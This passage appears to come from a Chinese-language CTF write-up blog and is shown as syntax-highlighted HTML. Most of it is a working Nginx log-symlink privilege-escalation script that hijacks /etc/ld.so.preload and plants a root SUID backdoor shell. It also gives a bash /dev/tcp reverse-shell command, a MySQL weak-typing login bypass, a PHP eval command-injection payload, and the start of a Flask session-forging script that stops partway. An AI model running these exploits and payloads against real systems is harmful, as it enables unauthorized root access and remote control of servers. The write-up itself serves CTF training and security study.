entity\" title=\"\\n\">\\n</span><span class=\"token variable\">$0</span> path_to_error.log <span class=\"token entity\" title=\"\\n\">\\n</span>\"</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>    <span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"It seems that this server uses: <span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">ps</span> aux <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> nginx <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F<span class=\"token string\">'log-error='</span> <span class=\"token string\">'&#123; print $2 &#125;'</span> <span class=\"token operator\">|</span> <span class=\"token function\">cut</span> -d<span class=\"token string\">' '</span> <span class=\"token parameter variable\">-f1</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> <span class=\"token string\">'/'</span><span class=\"token variable\">`</span></span><span class=\"token entity\" title=\"\\n\">\\n</span>\"</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>    <span class=\"token builtin class-name\">exit</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre><span class=\"token keyword\">fi</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre></pre></td></tr><tr><td data-num=\"112\"></td><td><pre><span class=\"token comment\"># Priv check</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[+] Starting the exploit as: <span class=\"token entity\" title=\"\\n\">\\n</span><span class=\"token entity\" title=\"\\033\">\\033</span>[94m<span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">id</span><span class=\"token variable\">`</span></span><span class=\"token entity\" title=\"\\033\">\\033</span>[0m\"</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre><span class=\"token function\">id</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-q</span> www-data</pre></td></tr><tr><td data-num=\"116\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token variable\">$?</span> <span class=\"token parameter variable\">-ne</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>    <span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[!] You need to execute the exploit as www-data user! Exiting.<span class=\"token entity\" title=\"\\n\">\\n</span>\"</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    <span class=\"token builtin class-name\">exit</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre><span class=\"token keyword\">fi</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre></pre></td></tr><tr><td data-num=\"121\"></td><td><pre><span class=\"token comment\"># Set target paths</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre><span class=\"token assign-left variable\">ERRORLOG</span><span class=\"token operator\">=</span><span class=\"token string\">\"<span class=\"token variable\">$1</span>\"</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token operator\">!</span> <span class=\"token parameter variable\">-f</span> <span class=\"token variable\">$ERRORLOG</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>    <span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[!] The specified Nginx error log (<span class=\"token variable\">$ERRORLOG</span>) doesn't exist. Try again.<span class=\"token entity\" title=\"\\n\">\\n</span>\"</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    <span class=\"token builtin class-name\">exit</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre><span class=\"token keyword\">fi</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre></pre></td></tr><tr><td data-num=\"128\"></td><td><pre><span class=\"token comment\"># [ Exploitation ]</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre></pre></td></tr><tr><td data-num=\"130\"></td><td><pre><span class=\"token builtin class-name\">trap</span> ctrl_c INT</pre></td></tr><tr><td data-num=\"131\"></td><td><pre><span class=\"token comment\"># Compile privesc preload library</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[+] Compiling the privesc shared library (<span class=\"token variable\">$PRIVESCSRC</span>)\"</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre><span class=\"token function\">cat</span> <span class=\"token operator\">&lt;&lt;</span>_solibeof_<span class=\"token operator\">></span><span class=\"token variable\">$PRIVESCSRC</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre><span class=\"token comment\">#define _GNU_SOURCE</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre><span class=\"token comment\">#include &lt;stdio.h></span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre><span class=\"token comment\">#include &lt;sys/stat.h></span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre><span class=\"token comment\">#include &lt;unistd.h></span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre><span class=\"token comment\">#include &lt;dlfcn.h></span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>       <span class=\"token comment\">#include &lt;sys/types.h></span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>       <span class=\"token comment\">#include &lt;sys/stat.h></span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>       <span class=\"token comment\">#include &lt;fcntl.h></span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>uid_t geteuid<span class=\"token punctuation\">(</span>void<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>    static uid_t  <span class=\"token punctuation\">(</span>*old_geteuid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>    old_geteuid <span class=\"token operator\">=</span> dlsym<span class=\"token punctuation\">(</span>RTLD_NEXT, <span class=\"token string\">\"geteuid\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> old_geteuid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>        chown<span class=\"token punctuation\">(</span><span class=\"token string\">\"<span class=\"token variable\">$BACKDOORPATH</span>\"</span>, <span class=\"token number\">0</span>, <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>        chmod<span class=\"token punctuation\">(</span><span class=\"token string\">\"<span class=\"token variable\">$BACKDOORPATH</span>\"</span>, 04777<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>        unlink<span class=\"token punctuation\">(</span><span class=\"token string\">\"/etc/ld.so.preload\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>    <span class=\"token builtin class-name\">return</span> old_geteuid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>_solibeof_</pre></td></tr><tr><td data-num=\"154\"></td><td><pre>/bin/bash <span class=\"token parameter variable\">-c</span> <span class=\"token string\">\"gcc -Wall -fPIC -shared -o <span class=\"token variable\">$PRIVESCLIB</span> <span class=\"token variable\">$PRIVESCSRC</span> -ldl\"</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token variable\">$?</span> <span class=\"token parameter variable\">-ne</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>    <span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[!] Failed to compile the privesc lib <span class=\"token variable\">$PRIVESCSRC</span>.\"</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>    cleanexit <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre><span class=\"token keyword\">fi</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre></pre></td></tr><tr><td data-num=\"160\"></td><td><pre></pre></td></tr><tr><td data-num=\"161\"></td><td><pre><span class=\"token comment\"># Prepare backdoor shell</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre><span class=\"token function\">cp</span> <span class=\"token variable\">$BACKDOORSH</span> <span class=\"token variable\">$BACKDOORPATH</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[+] Backdoor/low-priv shell installed at: <span class=\"token entity\" title=\"\\n\">\\n</span><span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-l</span> $BACKDOORPATH<span class=\"token variable\">`</span></span>\"</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre></pre></td></tr><tr><td data-num=\"165\"></td><td><pre><span class=\"token comment\"># Safety check</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token parameter variable\">-f</span> /etc/ld.so.preload <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>    <span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[!] /etc/ld.so.preload already exists. Exiting for safety.\"</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>    <span class=\"token builtin class-name\">exit</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre><span class=\"token keyword\">fi</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre></pre></td></tr><tr><td data-num=\"171\"></td><td><pre><span class=\"token comment\"># Symlink the log file</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre><span class=\"token function\">rm</span> <span class=\"token parameter variable\">-f</span> <span class=\"token variable\">$ERRORLOG</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">ln</span> <span class=\"token parameter variable\">-s</span> /etc/ld.so.preload <span class=\"token variable\">$ERRORLOG</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token variable\">$?</span> <span class=\"token parameter variable\">-ne</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>    <span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[!] Couldn't remove the <span class=\"token variable\">$ERRORLOG</span> file or create a symlink.\"</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>    cleanexit <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre><span class=\"token keyword\">fi</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[+] The server appears to be <span class=\"token entity\" title=\"\\033\">\\033</span>[94m(N)jinxed<span class=\"token entity\" title=\"\\033\">\\033</span>[0m (writable logdir) ! :) Symlink created at: <span class=\"token entity\" title=\"\\n\">\\n</span><span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-l</span> $ERRORLOG<span class=\"token variable\">`</span></span>\"</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre></pre></td></tr><tr><td data-num=\"179\"></td><td><pre><span class=\"token comment\"># Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre><span class=\"token function\">curl</span> http://localhost/ <span class=\"token operator\">></span>/dev/null <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null</pre></td></tr><tr><td data-num=\"181\"></td><td><pre><span class=\"token comment\"># Wait for Nginx to re-open the logs/USR1 signal after the logrotation (if daily </span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre><span class=\"token comment\"># rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-ne</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...\"</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token builtin class-name\">:</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">do</span> </pre></td></tr><tr><td data-num=\"185\"></td><td><pre>    <span class=\"token function\">sleep</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token parameter variable\">-f</span> /etc/ld.so.preload <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>        <span class=\"token builtin class-name\">echo</span> <span class=\"token variable\">$PRIVESCLIB</span> <span class=\"token operator\">></span> /etc/ld.so.preload</pre></td></tr><tr><td data-num=\"188\"></td><td><pre>        <span class=\"token function\">rm</span> <span class=\"token parameter variable\">-f</span> <span class=\"token variable\">$ERRORLOG</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>        <span class=\"token builtin class-name\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre>    <span class=\"token keyword\">fi</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre><span class=\"token keyword\">done</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre></pre></td></tr><tr><td data-num=\"193\"></td><td><pre><span class=\"token comment\"># /etc/ld.so.preload should be owned by www-data user at this point</span></pre></td></tr><tr><td data-num=\"194\"></td><td><pre><span class=\"token comment\"># Inject the privesc.so shared library to escalate privileges</span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token variable\">$PRIVESCLIB</span> <span class=\"token operator\">></span> /etc/ld.so.preload</pre></td></tr><tr><td data-num=\"196\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: <span class=\"token entity\" title=\"\\n\">\\n</span><span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-l</span> /etc/ld.so.preload<span class=\"token variable\">`</span></span>\"</span></pre></td></tr><tr><td data-num=\"197\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[+] Adding <span class=\"token variable\">$PRIVESCLIB</span> shared lib to /etc/ld.so.preload\"</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[+] The /etc/ld.so.preload file now contains: <span class=\"token entity\" title=\"\\n\">\\n</span><span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">cat</span> /etc/ld.so.preload<span class=\"token variable\">`</span></span>\"</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre><span class=\"token function\">chmod</span> <span class=\"token number\">755</span> /etc/ld.so.preload</pre></td></tr><tr><td data-num=\"200\"></td><td><pre></pre></td></tr><tr><td data-num=\"201\"></td><td><pre><span class=\"token comment\"># Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)</span></pre></td></tr><tr><td data-num=\"202\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[+] Escalating privileges via the <span class=\"token variable\">$SUIDBIN</span> SUID binary to get root!\"</span></pre></td></tr><tr><td data-num=\"203\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null <span class=\"token operator\">></span>/dev/null</pre></td></tr><tr><td data-num=\"204\"></td><td><pre></pre></td></tr><tr><td data-num=\"205\"></td><td><pre><span class=\"token comment\"># Check for the rootshell</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-l</span> <span class=\"token variable\">$BACKDOORPATH</span></pre></td></tr><tr><td data-num=\"207\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-l</span> <span class=\"token variable\">$BACKDOORPATH</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> rws <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-q</span> root</pre></td></tr><tr><td data-num=\"208\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token variable\">$?</span> <span class=\"token parameter variable\">-eq</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">then</span> </pre></td></tr><tr><td data-num=\"209\"></td><td><pre>    <span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[+] Rootshell got assigned root SUID perms at: <span class=\"token entity\" title=\"\\n\">\\n</span><span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-l</span> $BACKDOORPATH<span class=\"token variable\">`</span></span>\"</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre>    <span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span><span class=\"token entity\" title=\"\\033\">\\033</span>[94mThe server is (N)jinxed ! ;) Got root via Nginx!<span class=\"token entity\" title=\"\\033\">\\033</span>[0m\"</span></pre></td></tr><tr><td data-num=\"211\"></td><td><pre><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"212\"></td><td><pre>    <span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[!] Failed to get root\"</span></pre></td></tr><tr><td data-num=\"213\"></td><td><pre>    cleanexit <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"214\"></td><td><pre><span class=\"token keyword\">fi</span></pre></td></tr><tr><td data-num=\"215\"></td><td><pre></pre></td></tr><tr><td data-num=\"216\"></td><td><pre><span class=\"token function\">rm</span> <span class=\"token parameter variable\">-f</span> <span class=\"token variable\">$ERRORLOG</span></pre></td></tr><tr><td data-num=\"217\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token operator\">></span> <span class=\"token variable\">$ERRORLOG</span></pre></td></tr><tr><td data-num=\"218\"></td><td><pre></pre></td></tr><tr><td data-num=\"219\"></td><td><pre><span class=\"token comment\"># Use the rootshell to perform cleanup that requires root privilges</span></pre></td></tr><tr><td data-num=\"220\"></td><td><pre><span class=\"token variable\">$BACKDOORPATH</span> <span class=\"token parameter variable\">-p</span> <span class=\"token parameter variable\">-c</span> <span class=\"token string\">\"rm -f /etc/ld.so.preload; rm -f <span class=\"token variable\">$PRIVESCLIB</span>\"</span></pre></td></tr><tr><td data-num=\"221\"></td><td><pre><span class=\"token comment\"># Reset the logging to error.log</span></pre></td></tr><tr><td data-num=\"222\"></td><td><pre><span class=\"token variable\">$BACKDOORPATH</span> <span class=\"token parameter variable\">-p</span> <span class=\"token parameter variable\">-c</span> <span class=\"token string\">\"kill -USR1 <span class=\"token variable\"><span class=\"token variable\">`</span>pidof <span class=\"token parameter variable\">-s</span> nginx<span class=\"token variable\">`</span></span>\"</span></pre></td></tr><tr><td data-num=\"223\"></td><td><pre></pre></td></tr><tr><td data-num=\"224\"></td><td><pre><span class=\"token comment\"># Execute the rootshell</span></pre></td></tr><tr><td data-num=\"225\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>[+] Spawning the rootshell <span class=\"token variable\">$BACKDOORPATH</span> now! <span class=\"token entity\" title=\"\\n\">\\n</span>\"</span></pre></td></tr><tr><td data-num=\"226\"></td><td><pre><span class=\"token variable\">$BACKDOORPATH</span> <span class=\"token parameter variable\">-p</span> <span class=\"token parameter variable\">-i</span></pre></td></tr><tr><td data-num=\"227\"></td><td><pre></pre></td></tr><tr><td data-num=\"228\"></td><td><pre><span class=\"token comment\"># Job done.</span></pre></td></tr><tr><td data-num=\"229\"></td><td><pre>cleanexit <span class=\"token number\">0</span></pre></td></tr></table></figure><p>之后写命令</p>\n<p>反弹 shell</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>在服务器</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvnp</span> <span class=\"token number\">20000</span><span class=\"token punctuation\">(</span>监听端口<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>在菜刀的虚拟终端</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">bash</span> <span class=\"token parameter variable\">-i</span> <span class=\"token function\">bash</span> <span class=\"token parameter variable\">-i</span> <span class=\"token operator\">>&amp;</span> /dev/tcp/addr<span class=\"token punctuation\">(</span>服务器ip<span class=\"token punctuation\">)</span>/port<span class=\"token punctuation\">(</span>监听端口<span class=\"token punctuation\">)</span> <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>></span><span class=\"token file-descriptor important\">&amp;1</span></pre></td></tr></table></figure><p>反弹成功</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/%E5%87%BA%E9%A2%98%E4%BA%BA_1.jpg\" alt=\"\" /></p>\n<p>反弹成功后，在网站根目录下执行以下命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">chmod</span> a+rwx nginx.sh</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>./nginx.sh</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>./nginx.sh /var/log/nginx/error.log</pre></td></tr></table></figure><p>等待</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/%E5%87%BA%E9%A2%98%E4%BA%BA_2.jpg\" alt=\"\" /></p>\n<p>待漏洞触发时，拿到 flag</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/%E5%87%BA%E9%A2%98%E4%BA%BA_3.jpg\" alt=\"\" /></p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/%E5%87%BA%E9%A2%98%E4%BA%BA_4.jpg\" alt=\"\" /></p>\n<h2 id=\"登陆就有-flag\"><a class=\"anchor\" href=\"#登陆就有-flag\">#</a> 登陆就有 flag</h2>\n<p>MySQL 弱类型转换</p>\n<p>空异或 0 会查到所有非数字开头的记录，转换一下还有好几种结果：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&#39;^0#   &#39;^&#39;&#39;#</pre></td></tr></table></figure><h2 id=\"签退\"><a class=\"anchor\" href=\"#签退\">#</a> 签退</h2>\n<p>这里主要用到了 eval 函数的功能</p>\n<p>它会将参数作文 php 代码运行</p>\n<p>那么源码中的 <code>&quot;$$S&quot;</code>  要想办法绕过第一个 <code>$</code> , 因为肯定没有名为传入值的变量的</p>\n<p>这里可以将传入值用分号分隔</p>\n<p>如 <code>?S=a;system('ls');</code></p>\n<p>那么进行 eval 函数时，为 <code>$a;system('ls');</code> , 很明显可以作为 php 语句执行，先创建变量，然后执行 <code>system</code>  函数</p>\n<p>输入 <code>S=a;system('ls');</code></p>\n<p>只有 index.php，那么转为显示根目录 <code>S=a;system('ls /');</code></p>\n<p>尝试进入目录 <code>/var</code> , 即  <code>S=a;system('ls /var');</code></p>\n<p>发现 flag.txt，payload: <code>?S=a;system('cat /var/flag.txt');</code></p>\n<p>得到 flag</p>\n<h2 id=\"蓝瘦\"><a class=\"anchor\" href=\"#蓝瘦\">#</a> 蓝瘦</h2>\n<p>ssti 注入</p>\n<p>抓包，修改 session 值为 {“username ：‘admin'&quot;}，（加密后）</p>\n<p>加密解密脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">\"\"\" Flask Session Cookie Decoder/Encoder \"\"\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>__author__ <span class=\"token operator\">=</span> <span class=\"token string\">'Wilson Sumanang, Alexandre ZANNI'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># standard imports</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> zlib</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">from</span> itsdangerous <span class=\"token keyword\">import</span> base64_decode</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> ast</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># Abstract Base Classes (PEP 3119)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>version_info<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># &lt; 3.0</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Must be using at least Python 3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">elif</span> sys<span class=\"token punctuation\">.</span>version_info<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">3</span> <span class=\"token keyword\">and</span> sys<span class=\"token punctuation\">.</span>version_info<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># >= 3.0 &amp;&amp; &lt; 3.4</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">from</span> abc <span class=\"token keyword\">import</span> ABCMeta<span class=\"token punctuation\">,</span> abstractmethod</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># > 3.4</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">from</span> abc <span class=\"token keyword\">import</span> ABC<span class=\"token punctuation\">,</span> abstractmethod</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># Lib for argument parsing</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">import</span> argparse</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td 